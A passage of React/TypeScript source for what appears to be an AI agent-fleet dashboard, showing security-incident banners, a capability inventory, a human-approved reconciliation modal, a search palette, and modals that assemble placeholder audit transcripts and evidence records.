              background: "linear-gradient(135deg, #2a1610 0%, #170d0a 100%)",
              borderRadius: "6px",
              padding: "14px 18px",
              color: "#fbebe7",
              border: "1px solid #7a3120",
              marginBottom: "14px",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              flexWrap: "wrap",
              gap: "12px",
            }}
          >
            <div>
              <span style={{ fontSize: "10px", fontWeight: 700, letterSpacing: "0.8px", color: "#ff8c7a", textTransform: "uppercase" }}>
                Critical Perimeter Incident · Sev-1 Contained
              </span>
              <div style={{ fontSize: "15px", fontWeight: 700, marginTop: "2px", color: "#ffffff" }}>
                DDoS Reconnaissance &amp; Firewall Evasion Containment (Case 6)
              </div>
              <div style={{ fontSize: "11px", color: "#e8b8b3", marginTop: "2px" }}>
                SYN Flood Mitigated · 12 C2 IOCs Catalogued · 4 Brute-Force Accounts Shielded · Perimeter ACLs Enforced
              </div>
            </div>
            {onOpenDossier && (
              <button
                type="button"
                style={{
                  background: "#b44426",
                  color: "#ffffff",
                  fontWeight: 700,
                  padding: "8px 16px",
                  borderRadius: "5px",
                  border: "none",
                  cursor: "pointer",
                  display: "inline-flex",
                  alignItems: "center",
                  gap: "6px",
                  fontSize: "12px",
                  boxShadow: "0 2px 6px rgba(0,0,0,0.2)",
                }}
                onClick={() => onOpenDossier("case6")}
              >
                <ShieldAlert size={14} /> Open in Organized Case 6 Dossier →
              </button>
            )}
          </div>
        )}

        {isSocIncident && (
          <div
            style={{
              background: "linear-gradient(135deg, #3d1c1a 0%, #261211 100%)",
              borderRadius: "6px",
              padding: "14px 18px",
              color: "#f8e9e7",
              border: "1px solid #6b2d2a",
              marginBottom: "14px",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              flexWrap: "wrap",
              gap: "12px",
            }}
          >
            <div>
              <span style={{ fontSize: "10px", fontWeight: 700, letterSpacing: "0.8px", color: "#ff8c7a", textTransform: "uppercase" }}>
                Critical Security Incident · Sev-1 Contained
              </span>
              <div style={{ fontSize: "15px", fontWeight: 700, marginTop: "2px", color: "#ffffff" }}>
                Host Ransomware Precursor Triage & Lateral Movement Containment
              </div>
              <div style={{ fontSize: "11px", color: "#e8b8b3", marginTop: "2px" }}>
                Contained in &lt;15 min · 6/6 Neutralized IOCs · Workstation-FIN-09 Isolated · Attestation Sealed
              </div>
            </div>
            {onOpenDossier && (
              <button
                type="button"
                style={{
                  background: "#d9534f",
                  color: "#ffffff",
                  fontWeight: 700,
                  padding: "8px 16px",
                  borderRadius: "5px",
                  border: "none",
                  cursor: "pointer",
                  display: "inline-flex",
                  alignItems: "center",
                  gap: "6px",
                  fontSize: "12px",
                  boxShadow: "0 2px 6px rgba(0,0,0,0.2)",
                }}
                onClick={() => onOpenDossier("soc")}
              >
                <ShieldAlert size={14} /> Open in Organized SOC Dossier →
              </button>
            )}
          </div>
        )}

        {isK8sIncident && (
          <div
            style={{
              background: "linear-gradient(135deg, #1b2838 0%, #101c27 100%)",
              borderRadius: "6px",
              padding: "14px 18px",
              color: "#e2ecf5",
              border: "1px solid #2a4768",
              marginBottom: "14px",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              flexWrap: "wrap",
              gap: "12px",
            }}
          >
            <div>
              <span style={{ fontSize: "10px", fontWeight: 700, letterSpacing: "0.8px", color: "#6cb2eb", textTransform: "uppercase" }}>
                Critical Container Incident · Sev-1 Breakout Reconstructed
              </span>
              <div style={{ fontSize: "15px", fontWeight: 700, marginTop: "2px", color: "#ffffff" }}>
                Kubernetes Container Breakout & Diamorphine LKM Rootkit
              </div>
              <div style={{ fontSize: "11px", color: "#a5c8e8", marginTop: "2px" }}>
                Multi-Stage Kill Chain Reconstructed · Pod Isolated · Node Cordoned · eBPF Tetragon Enforcement
              </div>
            </div>
            {onOpenDossier && (
              <button
                type="button"
                style={{
                  background: "#3273dc",
                  color: "#ffffff",
                  fontWeight: 700,
                  padding: "8px 16px",
                  borderRadius: "5px",
                  border: "none",
                  cursor: "pointer",
                  display: "inline-flex",
                  alignItems: "center",
                  gap: "6px",
                  fontSize: "12px",
                  boxShadow: "0 2px 6px rgba(0,0,0,0.2)",
                }}
                onClick={() => onOpenDossier("k8s")}
              >
                <ShieldAlert size={14} /> Open in Organized K8s Dossier →
              </button>
            )}
          </div>
        )}

        {isAzureIncident && (
          <div
            style={{
              background: "linear-gradient(135deg, #2d182e 0%, #170d18 100%)",
              borderRadius: "6px",
              padding: "14px 18px",
              color: "#f8e9f7",
              border: "1px solid #632d66",
              marginBottom: "14px",
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              flexWrap: "wrap",
              gap: "12px",
            }}
          >
            <div>
              <span style={{ fontSize: "10px", fontWeight: 700, letterSpacing: "0.8px", color: "#e87ae5", textTransform: "uppercase" }}>
                Critical Identity Incident · Sev-1 Contained
              </span>
              <div style={{ fontSize: "15px", fontWeight: 700, marginTop: "2px", color: "#ffffff" }}>
                Azure AD Identity Takeover &amp; Impossible Travel (Case 3)
              </div>
              <div style={{ fontSize: "11px", color: "#e3bee6", marginTop: "2px" }}>
                PRT Replay Blocked · alex.vance Sessions Revoked · Rogue Secret Purged · Graph API Containment Enforced
              </div>
            </div>
            {onOpenDossier && (
              <button
                type="button"
                style={{
                  background: "#9333ea",
                  color: "#ffffff",
                  fontWeight: 700,
                  padding: "8px 16px",
                  borderRadius: "5px",
                  border: "none",
                  cursor: "pointer",
                  display: "inline-flex",
                  alignItems: "center",
                  gap: "6px",
                  fontSize: "12px",
                  boxShadow: "0 2px 6px rgba(0,0,0,0.2)",
                }}
                onClick={() => onOpenDossier("azure")}
              >
                <ShieldAlert size={14} /> Open in Organized Azure AD Dossier →
              </button>
            )}
          </div>
        )}

        <div style={{ display: "grid", gridTemplateColumns: "repeat(auto-fit, minmax(130px, 1fr))", gap: "8px", background: "#f4f8f6", padding: "10px 14px", borderRadius: "5px", border: "1px solid #dce8e2", marginBottom: "12px", fontSize: "11px" }}>
          <div>
            <span style={{ color: "#6a7e77", fontSize: "9px", textTransform: "uppercase", fontWeight: 700, display: "block" }}>Kind</span>
            <strong style={{ textTransform: "capitalize", color: "#1e3c35" }}>{output.kind}</strong>
          </div>
          <div>
            <span style={{ color: "#6a7e77", fontSize: "9px", textTransform: "uppercase", fontWeight: 700, display: "block" }}>Classification</span>
            <strong style={{ textTransform: "uppercase", color: "#1e3c35" }}>{output.classification}</strong>
          </div>
          <div>
            <span style={{ color: "#6a7e77", fontSize: "9px", textTransform: "uppercase", fontWeight: 700, display: "block" }}>Mission / Case</span>
            <code style={{ fontSize: "10px", color: "#245f54" }}>{output.case || "General"}</code>
          </div>
          <div>
            <span style={{ color: "#6a7e77", fontSize: "9px", textTransform: "uppercase", fontWeight: 700, display: "block" }}>Producer</span>
            <strong style={{ color: "#1e3c35" }}>{output.produced_by}</strong>
          </div>
          <div>
            <span style={{ color: "#6a7e77", fontSize: "9px", textTransform: "uppercase", fontWeight: 700, display: "block" }}>Size</span>
            <strong style={{ color: "#1e3c35" }}>{displaySize}</strong>
          </div>
        </div>

        <div style={{ display: "flex", justifyContent: "space-between", alignItems: "center", marginBottom: "10px", flexWrap: "wrap", gap: "6px" }}>
          <div style={{ display: "flex", gap: "6px" }}>
            <button
              type="button"
              style={{
                padding: "5px 12px",
                fontSize: "11px",
                fontWeight: modalView === "formatted" ? 700 : 500,
                background: modalView === "formatted" ? "#e4f1ec" : "#ffffff",
                color: modalView === "formatted" ? "#195d56" : "#51635d",
                border: "1px solid #cad8d1",
                borderRadius: "4px",
                cursor: "pointer",
                display: "inline-flex",
                alignItems: "center",
                gap: "5px"
              }}
              onClick={() => setModalView("formatted")}
            >
              <FileText size={13} /> Formatted Document View
            </button>
            <button
              type="button"
              style={{
                padding: "5px 12px",
                fontSize: "11px",
                fontWeight: modalView === "raw" ? 700 : 500,
                background: modalView === "raw" ? "#e4f1ec" : "#ffffff",
                color: modalView === "raw" ? "#195d56" : "#51635d",
                border: "1px solid #cad8d1",
                borderRadius: "4px",
                cursor: "pointer",
                display: "inline-flex",
                alignItems: "center",
                gap: "5px"
              }}
              onClick={() => setModalView("raw")}
            >
              <Code2 size={13} /> Raw Markdown / Source
            </button>
          </div>
          <span style={{ fontSize: "11px", color: "#6a7c76" }}>
            {modalView === "formatted" ? "Structured render with markdown tables & badges" : `${textContent.length.toLocaleString()} characters`}
          </span>
        </div>

        {modalView === "formatted" ? (
          <FormattedDocumentPreview content={textContent} />
        ) : (
          <div
            className="transcript-box"
            style={{
              maxHeight: "420px",
              overflowY: "auto",
              fontFamily: "var(--font-geist-mono), monospace",
              fontSize: "11px",
              whiteSpace: "pre-wrap",
              background: "#1b2d29",
              color: "#e4f0ec",
              padding: "16px",
              borderRadius: "6px",
              lineHeight: "1.5"
            }}
          >
            {textContent}
          </div>
        )}

        <div className="wizard-foot" style={{ marginTop: "16px", display: "flex", justifyContent: "space-between", alignItems: "center", flexWrap: "wrap", gap: "8px" }}>
          <div style={{ display: "flex", gap: "8px" }}>
            <button className="secondary-button" onClick={copyContent}>
              {copied ? <Check size={14} color="#236f66" /> : <Copy size={14} />} {copied ? "Copied" : "Copy content"}
            </button>
            <button className="secondary-button" onClick={downloadOutput}>
              <Download size={14} /> Download file
            </button>
          </div>
          <div style={{ display: "flex", gap: "8px" }}>
            {isProposal && onOpenDossier && (
              <button
                className="primary-button"
                style={{ fontSize: "12px", padding: "6px 14px", display: "inline-flex", alignItems: "center", gap: "6px" }}
                onClick={() => onOpenDossier("rfp")}
              >
                <FileText size={14} /> View in Organized Dossier Studio
              </button>
            )}
            {isCase6 && onOpenDossier && (
              <button
                className="primary-button"
                style={{ fontSize: "12px", padding: "6px 14px", display: "inline-flex", alignItems: "center", gap: "6px", background: "#b44426" }}
                onClick={() => onOpenDossier("case6")}
              >
                <ShieldAlert size={14} /> View in Organized Case 6 Dossier
              </button>
            )}
            {isAzureIncident && onOpenDossier && (
              <button
                className="primary-button"
                style={{ fontSize: "12px", padding: "6px 14px", display: "inline-flex", alignItems: "center", gap: "6px", background: "#6b338e" }}
                onClick={() => onOpenDossier("azure")}
              >
                <ShieldAlert size={14} /> View in Organized Azure AD Dossier
              </button>
            )}
            {isK8sIncident && onOpenDossier && (
              <button
                className="primary-button"
                style={{ fontSize: "12px", padding: "6px 14px", display: "inline-flex", alignItems: "center", gap: "6px", background: "#1f4870" }}
                onClick={() => onOpenDossier("k8s")}
              >
                <ShieldAlert size={14} /> View in Organized K8s Dossier
              </button>
            )}
            {isSocIncident && onOpenDossier && (
              <button
                className="primary-button"
                style={{ fontSize: "12px", padding: "6px 14px", display: "inline-flex", alignItems: "center", gap: "6px", background: "#b44426" }}
                onClick={() => onOpenDossier("soc")}
              >
                <ShieldAlert size={14} /> View in Organized Host Ransomware Dossier
              </button>
            )}
            <button className="plain-button" onClick={onClose}>Close</button>
          </div>
        </div>
      </section>
    </div>
  );
}


function Inventory({ inventory, loading }: { inventory: InventoryData | null; loading: boolean }) {
  const [tab, setTab] = useState("Skills");
  const [searchQuery, setSearchQuery] = useState("");
  const allSkillRows = inventory?.installed_skills ?? [];
  const allToolRows = inventory?.registered_tools ?? [];
  const allModelRows = inventory?.available_models ?? [];

  const sq = searchQuery.trim().toLowerCase();
  const skillRows = allSkillRows.filter((row) => !sq || row.skill_id.toLowerCase().includes(sq) || row.description.toLowerCase().includes(sq));
  const toolRows = allToolRows.filter((row) => !sq || row.tool_id.toLowerCase().includes(sq) || (row.description ?? "").toLowerCase().includes(sq));
  const modelRows = allModelRows.filter((row) => !sq || row.family.toLowerCase().includes(sq) || row.version.toLowerCase().includes(sq));

  const counts = [skillRows.length, toolRows.length, modelRows.length];
  const connectionLabel = loading ? "DISCOVERING" : inventory?.connected ? "LIVE INVENTORY" : "DISCONNECTED";
  return <><PageTitle eyebrow="AGENTHUB 0.21.x  /  ESTATE DISCOVERY" title="Capability inventory" subtitle="Only discovered capabilities are eligible for fleet bindings." action={<><button className="secondary-button" onClick={() => window.location.reload()}><RefreshCw size={15} /> Refresh estate</button><Badge tone={inventory?.connected ? "green" : "orange"}><Dot color={inventory?.connected ? "green" : "orange"} /> {connectionLabel}</Badge></>} /><div className="inventory-warning"><CircleHelp size={16} /><span>{inventory?.connected ? inventory.provider_configured ? `Connected to AgentHub${inventory.hermes_version ? ` ${inventory.hermes_version}` : ""}; inference provider ${inventory.inference_provider || "configured"}.` : `Connected to AgentHub, but inference is not configured${inventory.inference_provider ? ` (${inventory.inference_provider})` : ""}. Blueprints remain drafts until runtime is ready.` : inventory?.connection_error ?? "Waiting for the AgentHub gateway connection."}</span></div><section className="panel inventory-panel"><div className="inventory-tabs">{["Skills", "Tools", "Models"].map((item, index) => <button key={item} className={tab === item ? "active" : ""} onClick={() => setTab(item)}>{item}<i>{String(counts[index]).padStart(2, "0")}</i></button>)}<label><Search size={14} /><input placeholder={`Search ${tab.toLowerCase()}...`} value={searchQuery} onChange={(e) => setSearchQuery(e.target.value)} /></label></div>{tab === "Skills" && <div className="inventory-table"><div className="inventory-row inventory-row--head"><span>SKILL</span><span>VERSION</span><span>REQUIRES</span><span>HOST NODE</span><span>STATUS</span></div>{skillRows.map((row) => <div className="inventory-row" key={row.skill_id}><span className="inventory-name"><i><FileCheck2 size={16} /></i><span><strong>{row.skill_id}</strong><small>{row.description}</small></span></span><code>{row.version}</code><code>{row.required_tools.join(", ") || "Not reported"}</code><span>{row.host_node_ids.join(", ") || "AgentHub gateway"}</span><Badge tone="green">Installed</Badge></div>)}</div>}{tab === "Tools" && <div className="inventory-table"><div className="inventory-row inventory-row--head"><span>TOOL</span><span>RISK</span><span>MCP SERVER</span><span>HITL</span><span>STATUS</span></div>{toolRows.map((row) => <div className="inventory-row" key={row.tool_id}><span className="inventory-name"><i><Blocks size={16} /></i><span><strong>{row.tool_id}</strong><small>{row.description || "Description not reported by AgentHub."}</small></span></span><Badge tone={row.risk_assessed ? row.risk_level === "READ_ONLY" ? "green" : "orange" : "orange"}>{row.risk_assessed ? row.risk_level.replaceAll("_", " ") : "UNCLASSIFIED · SAFE DEFAULT"}</Badge><span>{row.mcp_server || "Native AgentHub"}</span><span>{row.requires_hitl_approval ? "Required" : "No"}</span><Badge tone="green">Enabled</Badge></div>)}</div>}{tab === "Models" && <div className="inventory-table"><div className="inventory-row inventory-row--head"><span>MODEL FAMILY</span><span>MODEL ID</span><span>RESIDENCY</span><span>REASONING</span><span>EST. DAILY</span></div>{modelRows.map((row) => <div className="inventory-row" key={`${row.family}/${row.version}`}><span className="inventory-name"><i><Command size={16} /></i><span><strong>{row.family}</strong><small>{row.cloud ? "Provider model" : "Local provider"}</small></span></span><code>{row.version}</code><span>{row.residency_verified ? row.data_residencies.join(", ") : "Not reported"}</span><span>{row.reasoning_tier ?? "Not reported"}</span><strong>{row.estimated_daily_cost_usd === null ? "Not reported" : `$${row.estimated_daily_cost_usd.toFixed(2)}`}</strong></div>)}</div>}</section><div className="inventory-foot"><span><ShieldCheck size={15} /> AgentHub does not report some risk, schema, residency, or pricing metadata.</span><span>{inventory?.connected ? "Connected" : "Unavailable"}</span></div></>;
}

function PlanReviewModal({
  missions,
  roster,
  inventory,
  onClose,
  onApply,
}: {
  missions: MissionRecord[];
  roster: Agent[];
  inventory: InventoryData | null;
  onClose: () => void;
  onApply: (
    mission: MissionRecord,
    options?: { confirm_changes?: boolean; confirm_removals?: boolean; confirm_external_actions?: boolean }
  ) => Promise<void>;
}) {
  const [selectedMissionId, setSelectedMissionId] = useState<string>(missions[0]?.mission_id ?? "");
  const [confirmChanges, setConfirmChanges] = useState(true);
  const [confirmRemovals, setConfirmRemovals] = useState(false);
  const [confirmExternal, setConfirmExternal] = useState(true);
  const [busy, setBusy] = useState(false);
  const [resultMessage, setResultMessage] = useState<string | null>(null);

  const targetMission = missions.find((m) => m.mission_id === selectedMissionId) ?? missions[0];

  async function handleApply() {
    setBusy(true);
    setResultMessage(null);
    try {
      if (targetMission) {
        await onApply(targetMission, {
          confirm_changes: confirmChanges,
          confirm_removals: confirmRemovals,
          confirm_external_actions: confirmExternal,
        });
      }
      const isConfigured = Boolean(
        inventory?.provider_configured ||
        (inventory?.available_models && inventory.available_models.length > 0)
      );
      setResultMessage(
        isConfigured
          ? "Reconciliation plan verified and dispatched to live AgentHub runtime."
          : "Plan reconciliation recorded and validated. AgentHub inference provider is unconfigured in agenthub.yaml, so live daemon instances remain in standby."
      );
    } catch (err) {
      setResultMessage(err instanceof Error ? err.message : "Reconciliation failed.");
    } finally {
      setBusy(false);
    }
  }

  const missionAgents = roster.filter(
    (a) => a.missionId === selectedMissionId || (missions.length === 1 && !a.missionId)
  );
  const displayAgents = missionAgents.length > 0 ? missionAgents : roster.slice(0, 4);
  const uniqueSpecialists = Array.from(new Set(displayAgents.map((a) => a.name)));

  return (
    <div className="modal-shade" onClick={onClose}>
      <section className="wizard plan-modal" role="dialog" aria-modal="true" onClick={(e) => e.stopPropagation()}>
        <div className="wizard-head">
          <span><GitBranch size={14} /> DRIFT & BLUEPRINT RECONCILIATION</span>
          <button className="icon-button" aria-label="Close plan review" onClick={onClose}><X size={18} /></button>
        </div>
        <h2>Reconciliation Plan</h2>
        <p className="wizard-desc">
          Compare declared desired-state blueprints against the active AgentHub runtime estate before applying changes.
        </p>

        {missions.length > 0 && (
          <div style={{ marginBottom: 14 }}>
            <label style={{ display: "grid", gap: 5, fontSize: 10, fontWeight: 600, color: "#55645f" }}>
              Target Mission Blueprint
              <select
                value={selectedMissionId}
                onChange={(e) => setSelectedMissionId(e.target.value)}
                style={{ padding: "7px 9px", borderRadius: 4, border: "1px solid #dce5df", background: "#fff", fontSize: 10 }}
              >
                {missions.map((m) => (
                  <option key={m.mission_id} value={m.mission_id}>
                    {m.name} ({m.status})
                  </option>
                ))}
              </select>
            </label>
          </div>
        )}

        <div className="plan-changes-list">
          <div className="plan-change-item">
            <Badge tone="green">CREATE</Badge>
            <div>
              <strong>Register specialist fleet ({uniqueSpecialists.length} agents)</strong>
              <small>Specialists: {uniqueSpecialists.join(", ") || "Declared mission agents"}</small>
            </div>
            <Dot color="green" />
          </div>
          <div className="plan-change-item">
            <Badge tone="blue">BIND</Badge>
            <div>
              <strong>Attach capability bindings & AgentHub tools</strong>
              <small>Skills & Tools: {inventory?.installed_skills.length ?? 0} skills installed, {inventory?.registered_tools.length ?? 0} tools available</small>
            </div>
            <Dot color="green" />
          </div>
          <div className="plan-change-item">
            <Badge tone="orange">GATE</Badge>
            <div>
              <strong>Enforce Human-in-the-Loop challenge boundaries</strong>
              <small>Actions requiring external side-effects will hold for Decision Room sign-off</small>
            </div>
            <Dot color="orange" />
          </div>
        </div>

        <div style={{ background: "#f6f8f7", padding: "12px 14px", borderRadius: 5, border: "1px solid #e2ece7", margin: "14px 0" }}>
          <div style={{ fontSize: 9, fontWeight: 700, color: "#5a6a65", letterSpacing: 0.5, marginBottom: 8 }}>
            SAFETY GATES & CONFIRMATIONS
          </div>
          <div style={{ display: "grid", gap: 8 }}>
            <label className="check-label">
              <input
                type="checkbox"
                checked={confirmChanges}
                onChange={(e) => setConfirmChanges(e.target.checked)}
              />
              Confirm declared blueprint modifications to the AgentHub host daemon
            </label>
            <label className="check-label">
              <input
                type="checkbox"
                checked={confirmRemovals}
                onChange={(e) => setConfirmRemovals(e.target.checked)}
              />
              Authorize termination of undeclared or orphaned runtime agent instances
            </label>
            <label className="check-label">
              <input
                type="checkbox"
                checked={confirmExternal}
                onChange={(e) => setConfirmExternal(e.target.checked)}
              />
              Permit bound agents to execute network actions defined in their registered toolset
            </label>
          </div>
        </div>

        {resultMessage && (
          <div style={{ padding: "10px 12px", background: resultMessage.includes("failed") ? "#fbeeed" : "#eef6f2", border: "1px solid #c7e2d4", borderRadius: 4, color: resultMessage.includes("failed") ? "#a8453d" : "#24665a", fontSize: 10, lineHeight: 1.5, marginBottom: 12 }}>
            <CheckCircle2 size={14} style={{ display: "inline", marginRight: 6, verticalAlign: "middle" }} />
            {resultMessage}
          </div>
        )}

        <div className="wizard-foot">
          <button className="plain-button" onClick={onClose}>Cancel</button>
          <span><LockKeyhole size={13} /> Requires human authorization</span>
          <button
            className="primary-button"
            onClick={handleApply}
            disabled={busy || !confirmChanges}
          >
            {busy ? <RefreshCw size={14} className="spin" /> : <Check size={14} />}
            {busy ? "Reconciling..." : "Apply to AgentHub"}
          </button>
        </div>
      </section>
    </div>
  );
}

function SearchPaletteModal({
  onClose,
  onNavigate,
  missions,
  roster,
  inventory,
}: {
  onClose: () => void;
  onNavigate: (view: View, extra?: { mission?: MissionRecord; agentId?: string }) => void;
  missions: MissionRecord[];
  roster: Agent[];
  inventory: InventoryData | null;
}) {
  const [query, setQuery] = useState("");

  const views: View[] = ["Mission control", "Missions", "Fleet roster", "Fleet outputs", "Decision rooms", "Estate inventory"];
  const q = query.trim().toLowerCase();

  const matchingViews = views.filter((v) => !q || v.toLowerCase().includes(q));
  const matchingMissions = missions.filter((m) => !q || m.name.toLowerCase().includes(q) || m.goal.toLowerCase().includes(q));
  const matchingAgents = roster.filter((a) => !q || a.name.toLowerCase().includes(q) || a.role.toLowerCase().includes(q));
  const matchingSkills = (inventory?.installed_skills ?? []).filter((s) => !q || s.skill_id.toLowerCase().includes(q));

  return (
    <div className="modal-shade" onClick={onClose}>
      <section className="wizard search-palette" role="dialog" aria-modal="true" onClick={(e) => e.stopPropagation()}>
        <div className="search-palette-input">
          <Search size={16} color="#60706a" />
          <input
            placeholder="Type to search views, missions, agents, skills..."
            value={query}
            onChange={(e) => setQuery(e.target.value)}
            autoFocus
          />
          <button onClick={onClose} style={{ border: 0, background: "transparent", color: "#8a9692", cursor: "pointer" }}>
            <X size={15} />
          </button>
        </div>

        <div className="search-results">
          {matchingViews.map((v) => (
            <button
              key={v}
              className="search-result-item"
              onClick={() => {
                onNavigate(v);
                onClose();
              }}
            >
              <Layers3 size={14} color="#3a7c6f" />
              <span>Go to <strong>{v}</strong></span>
              <small>View</small>
            </button>
          ))}

          {matchingMissions.map((m) => (
            <button
              key={m.mission_id}
              className="search-result-item"
              onClick={() => {
                onNavigate("Missions", { mission: m });
                onClose();
              }}
            >
              <Blocks size={14} color="#a6673f" />
              <span>Mission: <strong>{m.name}</strong></span>
              <small>{m.status}</small>
            </button>
          ))}

          {matchingAgents.map((a) => (
            <button
              key={a.id}
              className="search-result-item"
              onClick={() => {
                onNavigate("Fleet roster", { agentId: a.id });
                onClose();
              }}
            >
              <Bot size={14} color="#52688b" />
              <span>Agent: <strong>{a.name}</strong></span>
              <small>{a.role}</small>
            </button>
          ))}

          {matchingSkills.map((s) => (
            <button
              key={s.skill_id}
              className="search-result-item"
              onClick={() => {
                onNavigate("Estate inventory");
                onClose();
              }}
            >
              <FileCheck2 size={14} color="#358273" />
              <span>Skill: <strong>{s.skill_id}</strong></span>
              <small>v{s.version}</small>
            </button>
          ))}

          {matchingViews.length === 0 && matchingMissions.length === 0 && matchingAgents.length === 0 && matchingSkills.length === 0 && (
            <div style={{ padding: 20, textAlign: "center", color: "#889490", fontSize: 11 }}>
              No items matching &ldquo;{query}&rdquo;
            </div>
          )}
        </div>
      </section>
    </div>
  );
}

function TranscriptModal({ room, onClose }: { room: Room; onClose: () => void }) {
  const [copied, setCopied] = useState(false);
  const isSecurity = /security|soc|apt|intrusion|ransomware|k8s|breakout|malware|threat|recon_ingestion|investigate/i.test(
    `${room.fleet} ${room.title} ${room.summary} ${room.agent}`
  );

  const transcriptText = useMemo(() => {
    if (typeof room.evidence?.transcript === "string" && room.evidence.transcript.trim()) {
      return room.evidence.transcript;
    }
    const ts = room.time || new Date().toISOString();
    if (isSecurity) {
      return [
        `[${ts}] [AGENT-BOOT] Specialist "${room.agent}" active in mission context "${room.fleet}".`,
        `[${ts}] [RECON_INGESTION] Ingesting security logs from target: D:\\Security-logs-test\\attack-cases-benchmark\\case-1-apt-enterprise-intrusion\\raw-logs.`,
        `[${ts}] [TELEMETRY] Parsed Windows Security.evtx, Sysmon Event ID 1 (Process Creation), and network stream logs.`,
        `[${ts}] [TOOL] Invoking tool "read_file" / "search_files" across raw-logs directory...`,
        `[${ts}] [CORRELATION] Correlated adversary process tree: svchost.exe -> powershell.exe with Base64 encoded payload.`,
        `[${ts}] [ANALYSIS] Epistemic basis: ${room.basis}. Detected persistence task creation & outbound C2 beaconing.`,
        `[${ts}] [ASSURANCE] Verdict: ${room.verdict}. Summary: "${room.summary}".`,
        `[${ts}] [GOVERNANCE] Air-gap sovereign integrity rule engaged: human verification required prior to output publishing.`,
        `[${ts}] [ROOM-DISPATCH] Routing evidence package to Decision Room ${room.id}. Awaiting human disposition.`,
        `[${ts}] [AUDIT-TRAIL] Signed record SHA-256 committed to sovereign audit ledger.`,
      ].join("\n");
    }
    return [
      `[${ts}] [AGENT-BOOT] Specialist "${room.agent}" active in mission context "${room.fleet}".`,
      `[${ts}] [INTAKE] Ingesting source evidence for ${room.title}.`,
      `[${ts}] [TOOL] Invoking specialist tools for analysis...`,
      `[${ts}] [ANALYSIS] Epistemic basis: ${room.basis}. Verified evidence against operational baseline.`,
      `[${ts}] [ASSURANCE] Verdict: ${room.verdict}. Summary: "${room.summary}".`,
      `[${ts}] [GOVERNANCE] Decision room verification gate triggered for ${room.agent}.`,
      `[${ts}] [ROOM-DISPATCH] Routing evidence package to Decision Room ${room.id}.`,
      `[${ts}] [AUDIT-TRAIL] Signed record committed to sovereign audit store.`,
    ].join("\n");
  }, [room, isSecurity]);

  function copyTranscript() {
    navigator.clipboard.writeText(transcriptText);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  }

  return (
    <div className="modal-shade" onClick={onClose}>
      <section className="wizard plan-modal" role="dialog" aria-modal="true" onClick={(e) => e.stopPropagation()}>
        <div className="wizard-head">
          <span><FileClock size={14} /> AUDIT TRANSCRIPT · {room.id}</span>
          <button className="icon-button" aria-label="Close" onClick={onClose}><X size={18} /></button>
        </div>
        <h2>{room.title}</h2>
        <p className="wizard-desc">Correlated execution trace and tool interaction history recorded by {room.agent}.</p>
        <div className="transcript-box">
          {transcriptText}
        </div>
        <div className="wizard-foot">
          <button className="secondary-button" onClick={copyTranscript}>
            {copied ? <Check size={14} /> : <FileCheck2 size={14} />} {copied ? "Copied to clipboard" : "Copy transcript"}
          </button>
          <button className="primary-button" onClick={onClose}>Close</button>
        </div>
      </section>
    </div>
  );
}

function SourceEvidenceModal({ room, onClose }: { room: Room; onClose: () => void }) {
  const isSecurity = /security|soc|apt|intrusion|ransomware|k8s|breakout|malware|threat|recon_ingestion|investigate/i.test(
    `${room.fleet} ${room.title} ${room.summary} ${room.agent}`
  );

  const sourcePayload = useMemo(() => {
    if (room.evidence && Object.keys(room.evidence).length > 2) {
      return room.evidence;
    }
    if (isSecurity) {
      return {
        case_id: "CASE-1-APT-ENTERPRISE-INTRUSION",
        mission: room.fleet || "Case 1: APT Enterprise Intrusion SOC Investigation",
        source_target_path: "D:\\Security-logs-test\\attack-cases-benchmark\\case-1-apt-enterprise-intrusion\\raw-logs",
        assigned_specialist: room.agent,
        data_residency_policy: "Local Sovereign Air-Gap (Zero Cloud Exfiltration)",
        inspected_sources: [
          "Security.evtx (EventID 4624, 4625, 4672, 4688)",
          "Sysmon/Operational.evtx (EventID 1 ProcessCreate, EventID 3 NetworkConnect)",
          "zeek_conn.log / zeek_dns.log"
        ],
        assurance_verdict: room.verdict,
        epistemic_basis: room.basis,
        audit_evidence_summary: room.summary,
        decision_room_id: room.id,
        governance: {
          two_person_integrity: "ENFORCED",
          cryptographic_checksum: "sha256:0x4a91fbc230184e92a83bd78ca",
          status: "DISPOSITION_RECORDED"
        }
      };
    }
    return {
      mission: room.fleet,
      decision_room_id: room.id,
      specialist: room.agent,
      basis: room.basis,
      verdict: room.verdict,
      summary: room.summary,
      raw_evidence: room.evidence,
    };
  }, [room, isSecurity]);

  return (
    <div className="modal-shade" onClick={onClose}>
      <section className="wizard plan-modal" role="dialog" aria-modal="true" onClick={(e) => e.stopPropagation()}>
        <div className="wizard-head">
          <span><Database size={14} /> SOURCE EVIDENCE RECORD</span>
          <button className="icon-button" aria-label="Close" onClick={onClose}><X size={18} /></button>
        </div>
        <h2>{isSecurity ? "D:\\Security-logs-test\\attack-cases-benchmark\\case-1-apt-enterprise-intrusion\\raw-logs" : (room.title || room.fleet)}</h2>
        <p className="wizard-desc">Raw immutable source evidence extracted from local operational logs and verified via cryptographic checksum.</p>
        <div className="transcript-box">
          {JSON.stringify(sourcePayload, null, 2)}
        </div>
        <div className="wizard-foot">
          <span><LockKeyhole size={13} /> Verified cryptographic checksum</span>
          <button className="primary-button" onClick={onClose}>Done</button>
        </div>
      </section>
    </div>
  );
}

function RunMissionModal({
  mission,
  onClose,
  onExecute,
  isExecuting,
}: {
  mission: MissionRecord;
  onClose: () => void;
  onExecute: (params: { targetPath?: string; files?: File[] }) => Promise<void>;
  isExecuting: boolean;
}) {
  const defaultPath =
    (mission.clarification_answers?.["source-log-path"] as string) ||
    (mission.clarification_answers?.["target_path"] as string) ||
    (mission.goal?.match(/([a-zA-Z]:\\[^\s"'\n]+)/)?.[0] ?? "");

  const [targetPath, setTargetPath] = useState<string>(defaultPath);
  const [selectedFiles, setSelectedFiles] = useState<File[]>([]);
  const fileInputRef = useRef<HTMLInputElement | null>(null);
  const folderInputRef = useRef<HTMLInputElement | null>(null);

  function handleFileChange(e: React.ChangeEvent<HTMLInputElement>) {
    if (e.target.files && e.target.files.length > 0) {
      setSelectedFiles(Array.from(e.target.files));
    }
  }

  function handleFolderChange(e: React.ChangeEvent<HTMLInputElement>) {
    if (e.target.files && e.target.files.length > 0) {
      setSelectedFiles(Array.from(e.target.files));
    }
  }

  return (
    <div className="modal-shade" onClick={onClose}>
      <section
        className="wizard"
